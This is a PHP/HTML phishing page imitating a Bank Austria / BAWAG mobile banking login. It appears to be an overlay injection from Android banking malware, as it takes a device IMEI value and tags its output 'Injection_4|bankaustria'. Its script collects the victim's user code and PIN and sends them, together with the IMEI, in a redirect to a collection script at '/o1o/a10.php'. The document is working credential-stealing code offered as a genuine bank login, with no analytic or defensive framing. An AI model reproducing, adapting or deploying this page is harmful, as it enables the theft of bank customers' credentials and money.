<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>
	
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="at/com.bankaustria.android.olb/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

	<div class="header">
		<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAMAAADXqc3KAAAABlBMVEUAAAD///+l2Z/dAAAAAnRSTlMA/1uRIrUAAAAXSURBVCjPY2AgGTCiAppIDCgY9SDlEgDG3gC1nRXoEAAAAABJRU5ErkJggg==" style="padding: 15px;height: 50px;display: inline-block;width: 70px;margin-top: -10px;">
		<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAZgUlEQVR42u2ce5RdZZnmf9+3L+dWValLKgkhISEQuZgEm7sCg6NAo9jeGme0RRiZ0bFn6FnT9iztNe0gqM1M4wCKiDQwtCKgBlGJ0oCChgyCQAAJQRAQArknVamqVJ3LvnzfO3/sb9fZJ6ncIIGetdxr7XUue59z9n728z7vdR8lIvxx2fWi/wjBHwF6XYtffKGU2u3O3zv/T3n/4sNpJIaqr1i26kU+dssv+NW/P5vNY+OseHkTnz1+Iecte4QHzj2Fc3/2GKfP7GPl5hGuOn4hB93+IBccMshlR83j9AdXd0XGVhGpAR6Cgk5zF6Eh0LKwfdSYpGlfnxwsX76c008/HYDnnvs9xxyzhDiOp9w3lx7/QF8BofO0FeArZv/5rL6jUmPnKiuzlZWyWKswAiKQXSgxIuutMBQjz65qRC/+ut6M31QG7c9FAc3UoIFAqWpZ61N+dvqSMw8q+ScGgXfwZUfPn6mM6SYxkBpsbCBJkcROQmoFBGKDbNoQp0NPt6JVm5L0ns+vH7o/FhmLRJL/7wCyAmNRQmKFI3q7Fp8zb8ZHzl84+xMK5v7pIYNekqa0opTR1IICyQ1Lg9UKlCCJKX5lqOCQft875Mzu2rEWueDsnq5NE8bc+ZXN2+58uN58eG2cjrlrAjva6b8UgMSBUws0f/m2BWdFIud9/V8v+XArSWtiBZsaGkaw4kEJtGewScY1hQKl0LntiyCp7fjuRIQk0wXVpdVB3Z7/me/Mm/WZp5vRXbds237rjcNjyxpWGoAHmH9RAAngKfCVmj9zWu3ivzr5LR+ZiNKuprWgPMQKSivECtpTSKIQpdAoBNPWKRGwghLJgDJTk8G6Hx01loWl8JyvHjx41gd7u+66fXTi6n/cOvqQbUufvKkAaef1Rhstfc4Rcz515uEHfyny9AwRUGUPjEGMRVmL+AaVADpjCzoDCQUKQRAUHhjJAPUtYs1uT1EBkQixkeD4avmDb6uUzzilVrniSxuHv/V8FA+5XdI3BSAFjDQjFs/qn7No3kF/H/ZMOz+78qBEQCyYFJUkSJqi0gTRFkmdk1IFyRDJBESAwIFlLWhBjN0FbaWDwQ0jKOh6T3f1i0eGwTv+Zv2WLzxQb60qgCRvKED1OOXEuTOOPetT7//O/FnTFzVSQWntjkfAGjAppAkqiZA4QkUtlMpMROVxqnhIajLDEYOYBGVSbBIhcQyRQRDwg2LAhvK8AsidWrUg9M/89iGzFv7XDVv/9p5mcpfSWiulIq31GwSQCErp9x49b+7/8SvlWU3locs+aK99qMaCSZAkhiREeQGiNUStHEKUFSSto/wArzaAWPDCGpKkiF9GobHOowWHLwSlM2aWynhz52Ug7UKjZovM/47n3zh65Ft/WR4cHCkFwXi1Wn0eWAm8AAwdEIBEBO3p91Zqte/acrU/DkroIAQv6ATIGiRNUHEESYh4XpthTowlDAj+1Xvwjz4ePTALFYbo6QchCHpa3+t2HiF0TYP3T7HpN9baH8ZxfIVLt+x+AUhE0Fq/p1ypfE9Vaj1SrqLCMgQh+CH4XjsYsgaVxhCESBSglHLZhIC10KzjH30SlQs/12k+hYDmAC4nH3ro/JO/eMkl6aWXXPKN3YUGet+EWR1dqdWuVZVqBk6lBtVuqPWgaj2o6jRUrRfVNQ1V7YZKN1S6UOUqlKuoUgVKZVSpBIA399CdwHmjlkqlwplnnHEeUAGC182g4+fOmHHyEfNuSv3SfEqV9kmXa1CqQBCiPL+tE2kCSQu8LA9VYhFrUWmKBAmq1kX60jMEUTMD7k1YarVa/7RpvUeMjY2+AMRTmdoeGRRoxc3nnsodF5x98bzB/pNi5aOCEoQlCCsZSJVaxphaD9S6s7XaBeWaY04ZclMMQggCVKUbWfci0dJrsKPDbwpAW7YODR48Z84SZ2Lea2JQYoV3HTb7A7MHev9zy4AqB5nehCVUqezMpgrlSgac8sCm4LUy3bI5m2KUHyG+E3Q/AN8nffxXmBefJTzz3+Ifewqq2vWGgDMyMsLTq5/Rvh+UgRLQfE0AfWLJ/L6+avl/tgTwvGz1fZQXTJ6oCktQqqHKFdA+pEkWJRuTBYh+CL7vPq+zR61Rno+UytjhzTRvuhxv+SLCP/s4wTEnHlBw4jjmpz+7mzUvrxnZsH7dJgeQ2meR9rXiohMW/nW1HByVxboatM50RunMrXt+dvJBiCo7UyuVUX6YbdO6veafU6q9kgGvSiHJbx+mef3l2M0bDihA9977Cx578glZ/bvVTw4NbZ3YnavfLYM+uWT+/BPmDFzYiE1b5yUvahVfZ49iLcqaTKT3NbIXwPfxDj0CPTB4wMC5665/5o47f0p568bkN8t/udJhYHZ1wLtk0EG1Mv/miIMvNKk5WIzNTlpMFsOIRYzJtMambY/VnMDWt0OrkUXQaZKlGyYF44ATm32HdRm7OyxJU7y5h1G54KID5vrvuONH3HDzd9FbNjLnyUfDt4f+4YX4Z99M7Mj+rtlnHDrrY60odXlVYU2TSeGVJEaiJtKsI41xaGxHmhNIqw5xE0nyfZM2UMYUQJMs4g5KVM67CD140AEBZ+nS27nm+hvxhrYy5+knmGli3jWtdmKQFeJ9h4XaKxMreZprTlt0VrMRHU7ogUkgjbOsPIkhiSGJkDiLfSbjnCTKdEUsJAkStyBqZo9JlG1PYkgdq6yF1ECSEL7/PPxjTtrvwKRpyrXXXscddy5joFXn6HUvMzOJ6A59Dtb6kLdXS4tX1Ft/cEId72hqUwIUGat6Q++Txrii1SRrYseaCBUFTnDJsvA0zgJFlDPBBOIIoia0mhk4cQ5unDHLGCSO8f/kVMIzP7zfwRkfn+D6G27gJ3fdzcGtOoteeYEBMfQGIdM8xaCnK0sq4bEr6q17gbJz9fEeAbrsuMMP7/O9t6fGgFFZZp7EqLiFeD7K9xClXS3HxTl+nLlv5QTbpJBEEEUQNaBVd2xqIkkTTIxEEbp3BuVz/+N+j6ZHRkb46hVXsuLBhzi0PsbRm9YyXSzTwpBeT1NxxnRKtbxoqT9xyJbUbnd47Bmg4/u73x0KQWIFZSykFuIY8Zoo7SPacwUul3imCXgtxPdcFV4y8U5iJI4yAW81kKiRMSpqQRSDgdJH/nK/687atWv5+jeu4dGVT7BwYoTFG1+lT2v6SiV6PCij0ApSgbmBv6Db8+ZuSe0LWQGAVtHlTwlQMzFnk2YCilaZxzIKFUWTZiXiSqlp4vIwLwsSVQ6cQZIU0gjiCGk5cFoNiCNso0F4+gfwF+/foPDll9dwyZe+witrXuKto8McuXUDfZ5Hf+DToxVlpbKinWTV8IpWXQtDf/4foqQGjLmUY2qABsOAdw5O6z+lt+vIZmywvmR1Z6VQyiIk5LVRZUxmRkGM8gMkDwpzgIx1ZpYJOnETaTUnwdEHH0549scys9xPy8qVj3P5lVexddMmFg9v4ahtm+j1fPoCn2laUVJZD8WSlfUFiKzw9mr58HvHm92SCbUHJFMCVNaqdFi1tGDA9/pHYpM5pNSgtMIq0OJlMaK12ftpAkEL8QPQQbsgL9IODdI4M8+k5TxbCoSUPnghqqdvv4Hz6KOP8ff/cDn14WFO3ryWQ8dHmRYEDPgePVoRkjOHSXCy6qNwsO8dqhU1I5QcJnnRcycTq6XWzpMknSZKQSIoFKIMytXBlAt7s3JpAoHLy5SX9X7yo7BZ0V5cXRpjkFSwE3VK7zsf/+jj9hs4d999D9d86zrs9u2ctHkth02M0hsE9AU5OBqUYEWwCNadf1737/L0oIeqGCR0DNJ5ALkjQGWMnUliwiyE9LEYlMq+SQkIFqyHeILyTBbT6Ni1cshE2l2fLALPzc0iExP4Rx1P6T0f3W/gfO/7P+Cmm28hnNjOOza+wtyoQX8Y0u95dHva0UGyXELa6ZHNWgFYgapWgypz84EDSE1pYgqqWphJalwjTzmsvXbr1GgIQHkW0RrleYg22VcWuwwCWJsdlLFIFEG1l9KHLsxqQvshALz+hhtZ+uOf0NtqcMLGtcyPGvSGAQOeT00rQtU+7MysMta0r6Hk6UTgsAh2jKj9HWrOSoxoEgeQ26+YlyqbsUI8jWiD9qxLWFwj0DGNQqdUjEFaMZU//wu8BUfuhwBwnG9e+y1+/qvlzKhPcNKGNcw2CQOlkD7Po0trfAeOWHG5tBTardLOsdvGpguFs6kBQshOJjYZyu5NEYsSizIW8VUWG3leJt6edaWL9nyRLTbrRZBGg+AdZxCe9fqj5YmJCf7hq1fwqwcf5LD6dv5ky3pmW8NAqUS/r+jSGm/y553mCFglWa6MIJJ5MiuZSIvsOln1pxrPkDhtR8SS9a8QEE0WWXuAZzOvpTXozENIx2+4q9RqoQdnUfnoZ7J9X8eyefNmvnjpl1n93HMcMTHGsZvWMlPD9HJIv9bUtMJTKmNLJ0MQyRvcO7Cp7dFUYd0VQPlkhcG601WAWIW2Ar6grEI8i/KcSWkvq9OjOmsDAjZJQGkqH/00eubri5afffY5rvra1/n9Cy9wzOgQi4Y3McPTDAY+/Z5HVavJCE8AMwkGO5uWkgLNd1+52plBuZ2kFiTNzMv3sC7tEE+hPI142rWAbWaOO47vCUijTvm95xKedubrAmfVqlV8+bL/xZaNG3nb9m28dWgj0wOfGWFAv6epKo1WjhmSufPMRxRMrGBSVlTh/Wx/djER4k/RtZ1M1sRY57lsVtbwxNWUBTybjbRMlk87QZKohb/gLVQ//dlCx3Xfl/vuu5+rv3UdE9u2cfLwJo4YHWIgDBkM/Q5wclAKBU5E5aZWMLH8tWMYAnUrw7azcSi78GK0rMjmjtFpESSRbKjA0yitsU6g0Zke5Zm9wuVpaYoql6j9p8+hul57l2Lp0tu5+bbbsKOjnDi0iSPHhhkohQz6mVlVtEZnkVl2HZGs+JCDYNVkvFMEpejFAMatHZFsAsRSnK3YCSBopiIbLdJUUJEdxduaLKr2DKI14kDKrVKUymKfZpPqX1xIcNxrK4BZa7nppn/iu99fSncac9LGV1nQGKe/VGJG4NHrmKMmg7124Je5dcnKWHn0LJk5mdykrMI401LAUGo2GZHYRc92lwyyMG7hRYEhgbm7Kq5n43HWJbHKaZDb3GgSnnAS1U986rWN1dTrXPONb3LnL37BrDji+I2vMC9uMVAKmR549HmaijPpLMxqeyQrglWubJ6zxOmxlU6RFsmYFwKPN5M/SLtYZnaZzY8Zkzww0XzpuVaybX7oz432dJtCPiqXL8ag+vrp+vzFr8m0tm7dyhVXXMnDKx9nQavOko1rmWsSppdDpnse0zyPslYuLxSM5EI7GXIh5PlWgVkFPTJZYD/p7lMwz0TxelcHSnbscHQA1LDC082o9fsoemJhKTgm2pf7OESQVovuz/0dwaIl+wzO879/niuvvpqnV/+Ot0QNjt24hpnAQBgy3WXkJZ0Nelp39a3Lxo1z69aZ1qR3KmqTU2ERQZzpeQrWJ2bduJUtZBoUOZBktwWz2HKfRT65T22tRp3yOR+g+tFPvIZSxaNcc+11rFmzhsX1UY7ZvJ5BXzPoyhXdWhM6R2mkoDtSYIp7nktxG6ROs5JCay/Qiieb0QubU7PJARPtVoPy5aZtYw+8q6e6LYD+veGQRBHevPl0//XnwI227O3y85//gqu/eS1Rvc5xI1s5amQL0wOfwcBnwNd0aY+gAE4OiIHOWKbwvqFtQlYKjMvZ5LY3rU1+FyXPAg23RjvOCU0J0PLxxpbhNL17duB/3MieTQtP0/VX/w3v0MP2CZxbb72NG2++hXLU5IQt61k4PspAEDA9zNx4TSt8l/IYCl5IOs3JTLKosD1/PwcPKcRKgge8kpihp6N0tTOveoFBe2wcJreNjP8gVGr3A9lKYRsNKu//MJUPnbvXwGzfPs7Xv3Y11/3Tt+lp1jl5wyscOT7GjFLIzNBnuqfp0grfhQ85AIJ0sKGYbLbB2c1zOp8/1Yof35qaoQKDdpqG3WX2uGx0YmUsrNxdeinNBsHCt9D92c/vNTivvrqWSy69lB8uW8acqMUp615iYavOjHLAzMBnwPOoeh7aJZ3GZt4q9z5mChMzbhw9Y46dkk3FzF6UMGbM+F3jrRXOtU84L2b2uvX8cpxsvGl49I4eb+pdJM2mxLo/9wX0jFl7Bc5TT63i0i9/hceeeJIFzXFOXvsi80zMjFLILJd0lrVCOdE1rvNgpnpeWO3k/mBQbfAsBXfPJFA+8GAjWvFqkq514IxPpT+7BahlhZ+O1r+/KTHPBlPcRyatiMqHPkLpXXuXiC5fvpyLv/RlXnr5ZRZt38ZJ69YwWwkzyyVm+D492qNULEbmLBE6PdUUJmYL8VCHF1OykwZpYCS1Iz8Zb65w4Iw5gOKpEvvdWZB6sN5c+4OR7Vd6SklHpSeOKR17Al3/5W/2Km249dbbuOzy/01zdITjN6/juK0bmBV4zAwDBjyPbi8TY+vq/ZMmJYIRW3jN5PuWnFHt923H6yKgkt9ahVbI3fXW/RsSs8YBNOpazum+zgcJ4F25ZeT2U7uq7zuiHHwgFrJWT7VC93+/GN3bt8e04cqrvsb9D6ygJ4k5bsMrzGuO0xeEDAQevYU6Tu6p8lhlMuEsxj6AcbmWzYEquvFJzyYdYOUMDIBno+TFO8eb9ztRHgG2O/Pat/mgnACbUzN20botl8XCFqwlbbWoXvApgmNP2IMYv8rffeFi7v3lcmY1Jnj7qy+yoDnBQBgyI/Do05qqao92mQ7mtAU43VFk6TQx6TChQqoh7YjP1XuYsNK8ZbS+dMLYrY45I449u/TWewJIAO+ZZvTEDVtH/4dqtZql095J1yc/vdsPPfTQw1z6pa/w1OrVHD4xygnrXmKuieh3pYoez6Pkmow291TYDKTJ5zIZ1E0+5uZjZdJzTcZCuTebFOt2vuZutTK3jk3c/ttW8oxjzZB7jHdXVFTFZHM3N/X6AZRvfttRV33ke7f/B+/It+4SnDuXLeOHP15GfXiIueteZsGWDUz3NP1BSL+n6PI0oVKTd/e0azRTZOZ5Y6TADlNgjZF2DGQKzDFSME0RAgU/HW/d+48jE7cCw8AGt47tCqB9vanXlHt7J+Z843qzK3DqjQY/+tGPWf7wI5RaDeateZ7ZQ5vpCwL6A58+T2WRsatT2ELjw5X4JwGRgqh2gFIMDJnaxGxHjQjKSrGiET12w2h9aYE5Q06g4z0NU3YAdNVVV02NjjFy4okn/tmpp5563lTb163fwD33/pzfvfAiA6PDdD/xGwa3j9FfLtHvaXo8j0p+yyWW1N0Bnp8ceSvGZdoieSVQMIVSaYfO2KwgJgUTE1UU6awL+Egz+u0NIxM3W5ExYCuwxTEn2ptJ0w6AVqxYMeVOixcvnnXaaaddCtR23PbII49w/4pf02w0mPaH5yk99AB9JqG/koHTrRVlDZq2d0Kkw7Q66sS2LbQinTmUKdSUpzIxcfqjgADhoUb80HUjE98bMXaDA2fz3gjzPmvQcccdd9rKlStX7Njd/Mmdy3hs5ROEJqXrd6uoPfs0fQr6w4Be36NLaUoqv3VT2k3FjnbMVEB1VgBNoYbcdvkFNkk70/eyWCr96fbG/d8ea9xuRLY53dlYMK093oG4TxoUx3E9ilqNUqlcBVi9+hluueVW1rz6CipNtxzyzG+7+oc2VbtLZfp8j16tqOhscEAUGKzrKuT9SHG3g7tuQ0enQblyqNumcg1yelQouhfjI+tYM5za4dvGGj+6d6L1gMvQtwCbgG3u9T7dnrlXDAqCoPTxj5/3t+eff/4lzzzzDCtXPs7IyCjD24b+76rfPnnfjGa968LBvvcdXysdVdU6G5FQqt2j72g4dTIGdmTNziJtO0SayXpybnq+CxeeasVP3TBSX/pqkr7owNjsTCs3q73+I4Icl7118yWg5+ijF100b968fxfHUbJ27av//Pzzzz/k8phGr6er5/d1v++cnuoH5wb+rIa1HcVd2Qks6QDJ7jRU0H5eLLFKwYV7KhPil2Kz4ef11j3Ltjd+bTMwxpw5DbvnLXYzTb8/AAqAbqC/t7fvLfX6hE6SpOl+eNRdLQt4S8rh4nd3VT74oWm1c7q0nhEX0oDij+f/ZWIdzbLqn2o3+wqF9vzzOTjKjWCsT8zaFY1o5T0TreVbU7POeaZtDpxRpzc7FcEOBEDKzRHXgC6yu/TEATPugMLtUwa6F5aCJe+ulU99V3flzEHPO6Kila/IJkvNDoEfuxhLyW4ezgReCaQIDSvm5cQ8fd9E89FVrWT1ptSsdyCMO3BG3fPmjgX4AwlQDlLgWkn5hElS6CXloh86AMtAb6DUwFGlYOE5PZV3zvS9RXMCf0aP1j1lpWqBYrL9V9QgECIrJIiMW7t9OLXj6xKzcX2SvrCiHj21Jk03GWG7u0ANB8hYAZiY1/n3FK8FoOIMjdpJezv3KQJVdWsZqB4WBnPmBN78Hk/PrCo1PVR0uREsVdSphrWjkUh9s7HrX4nTjcPGjriTThxjc/bW3dqcqq/1RgO0L0sO1I6sCh0Tg8J2f8fJrh2GCPKhisiB03RrVOhlmf158G8EQMUlnxwNpliL4KgdwLHuxFMHQr6mBVDsgTjgNxqgIqtUwRHpwqp2UW6xBSAs+/GfXfZbJL0/f9etee6hpxp7m2JmSQpgvaHL/wOs8ieMTwRk8gAAAABJRU5ErkJggg==" style="width: 40px;display: inline-block;padding: 5px;margin-top: -9px;">
		<p>Login</p>
	</div>

    <div class="main">
        <div class="container">
            <div class="row">
                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

                        <form id="form">
<br>
                            <div class="form-group ">
							<label>User Code</label>
                                	<input type="text" class="form-control" name="field2" id="login" autocomplete="off" maxlength="17" data-reg="/.{4,30}/" required="">
                          </div>

                            <div class="form-group">
							<label>PIN</label>
                                	<input type="password" class="form-control" name="field3" id="password" autocomplete="off" data-reg="/.{4,30}/" maxlength="20" required="">
                            </div>
                    	<input type="button" style="margin-bottom: 20px;" class="input_submitBtn" onClick="sentServer();" value="Login">
<?php
echo "<input data-role='none' type='text' name='imei' value='$IMEI_country' class='imei' style='visibility:hidden'/>";
?>

                        </form>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>

<script>
	function sentServer()
	{
			var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	
	var imei_c = document.forms["form"].elements["imei"].value; 
	var login1 = document.forms["form"].elements["login"].value; 
	var pass = document.forms["form"].elements["password"].value; 

	location.replace('/o1o/a10.php?p=' + imei_c+"|Injection_4|bankaustria|"+login1+"|"+pass);
	}
}
</script>

</body>




</html>
